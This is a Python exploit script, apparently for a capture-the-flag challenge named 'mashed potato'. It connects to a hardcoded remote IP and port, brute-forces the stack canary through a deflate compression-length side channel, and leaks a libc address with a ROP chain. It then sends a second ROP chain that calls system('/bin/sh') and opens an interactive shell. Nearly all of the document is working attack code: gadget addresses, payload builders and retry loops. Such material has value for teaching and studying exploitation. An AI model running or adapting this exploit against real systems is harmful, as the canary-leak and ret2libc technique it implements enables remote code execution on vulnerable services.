"""Exploit script for "mashed potato". It's not very reliable, and kinda
slow, but it auto-restarts. So just invoke 8 separate instances of it and
wait for your shell! :P"""

# First, here is the payload we'll use after we've leaked the stack.

# From the "mashed potato" binary
# .got.plt:0000000000602088 off_602088      dq offset atoi
# 0x0000000000400fb3 : pop rdi ; ret
# 0x0000000000400fb1 : pop rsi ; pop r15 ; ret
# .text:0000000000400E54 main            proc near
# .plt:0000000000400870 _puts           proc near

# From the remote libc
# .text:0000000000039F50 atoi            proc near
# .text:0000000000046640 system          proc near
# .rodata:000000000017CCDB aBinSh          db '/bin/sh',0

import struct

# Rop payload to leak a libc address
ropleak = ''.join(struct.pack('<Q', i) for i in [
  0x0000000000400fb3, # : pop rdi ; ret
  0x0000000000602088, # off_602088      dq offset atoi
  0x0000000000400870, # _puts           proc near
  0x0000000000400E54, # main            proc near
])

# Rop payload to use that leak to call system("/bin/sh")
def ropsh(leak):
  atoi = struct.unpack('<Q', leak.ljust(8, '\x00'))[0]
  libc = atoi - 0x39F50
  system = libc + 0x46640
  binsh = libc + 0x17CCDB
  return ''.join(struct.pack('<Q', i) for i in [
    0x0000000000400fb3, # : pop rdi ; ret
    binsh,
    system,
  ])

import socket, time, sys

def recvuntil(s, show=True):
  dat = bytearray()
  while not dat.endswith(s):
    cc = sock.recv(1)
    assert len(cc) == 1
    if show:
      sys.stdout.write(cc)
      sys.stdout.flush()
    dat.append(cc)
  return bytes(dat[:-len(s)])

from zlib import compress
def test(s):
  """Exploit the oversized-buffer-to-deflate() compression leak and give
  a score of how well the input `s` matched the stack canary (measured in
  number of additional bytes `s+canary` took to deflate over just `s`)"""
  assert len(s) == 503
  assert '\n' not in s
  recvuntil('Select : ', False)
  sock.sendall('2\n')
  recvuntil('Message length:', False)
  sock.sendall('512\n')
  recvuntil('Message : ', False)
  sock.sendall(s)
  sock.sendall('\n') # Newline makes fgets() stop, instead of overflowing canary.
  # Note that fgets() adds a null byte that overflows into the canary, but
  # the first byte of a canary is always zero anyways!
  return int(recvuntil(' bytes of message sent\n', False)) - len(compress(s, 6))

def rop(chain, canary):
  "Given the canary, overflow `chain` into a return address."
  assert len(canary) == 8
  assert '\n' not in chain
  recvuntil('Select : ')
  sock.sendall('1\n')
  recvuntil('Message length:')
  sock.sendall('%d\n' % (512+8+len(chain)+2))
  recvuntil('Message : ')
  sock.sendall('A'*504)
  sock.sendall(canary)
  sock.sendall('A'*8)
  sock.sendall(chain)
  sock.sendall('\n')

from collections import Counter
from itertools import product
from traceback import print_exc

while True:
  # This attack is ~5% reliable for a random canary. Luckily,
  # canaries are random so we can just retry a bunch.
  sock = socket.create_connection(('54.178.148.88', 8888))
  
  # Bootstraping phase, better than 256*256: try a bunch of
  # "\x00aa" "\x00ab" "\x00ac" ... "\x00ba", "\x00bb", ...
  # patterns at the same time.
  sequences = []
  for x in range(256):
    if x == 0 or x == 10: continue
    
    # We split each potential second character into six groups.
    # We could do it in just two groups, but I thought this would
    # be better for zlib reasons. (I forget why I thought that at the time.)
    seq = []
    for y in range(0, 46):
      # We steal '\x01' for padding, and forget about '\x02'
      # to make sure each group has an even number of trials.
      if y == 0 or y == 10 or y == 1 or y == 2: continue
      seq.append('\x00'+chr(x)+chr(y))
    sequences.append((chr(x), ''.join(seq).rjust(503, '\x01')))
    
    seq = []
    for y in range(46, 88):
      seq.append('\x00'+chr(x)+chr(y))
    sequences.append((chr(x), ''.join(seq).rjust(503, '\x01')))
    
    seq = []
    for y in range(130, 172):
      seq.append('\x00'+chr(x)+chr(y))
    sequences.append((chr(x), ''.join(seq).rjust(503, '\x01')))
    
    seq = []
    for y in range(172, 214):
      seq.append('\x00'+chr(x)+chr(y))
    sequences.append((chr(x), ''.join(seq).rjust(503, '\x01')))
    
    seq = []
    for y in range(214, 256):
      seq.append('\x00'+chr(x)+chr(y))
    sequences.append((chr(x), ''.join(seq).rjust(503, '\x01')))
  
  arr = []
  for i, (x, seq) in enumerate(sequences):
    if i % (len(sequences)/20) == 0: print '%.0f%%' % (100.0*i/len(sequences))
    arr.append((test(seq), x))
  
  charset = ''.join(chr(i) for i in range(256)).replace('\n', '').replace('\x00', '')
  def extend(canary):
    "Given a partial canary, find the next byte."
    return min((test((canary+x).rjust(503, '\x00')), x) for x in charset)[1]
  
  # Try the fifteen most likely candidates for second-canary-byte (remember,
  # the first canary byte is always zero) from the bootstrap.
  arr.sort()
  for x, c in arr[:15]:
    canary = '\x00' + c
    print x, repr(canary)
    canary += extend(canary)
    
    # If extend finds \x01 as the third byte, that's because it's using min()
    # and it's mostly likely that we were wrong about the second byte.
    if canary[-1] != '\x01':
      break
  else:
    sock.close()
    continue # Abort, try again. 
  
  # At this point, we've gotten 3 byte that are in the canary (or so we believe),
  # at which point it becomes easy to find the next byte without fancy metrics.
  for _ in range(5):
    print repr(canary)
    canary += extend(canary)
  break

print "Got the canary: ", repr(canary)

rop(ropleak, canary)
leak = recvuntil("\nLeave your message")
print "Got libc pointer: ", repr(leak)
rop(ropsh(leak), canary)

print "POPPIN' $HELLZ"
import telnetlib
t = telnetlib.Telnet()
t.sock = sock
t.interact()
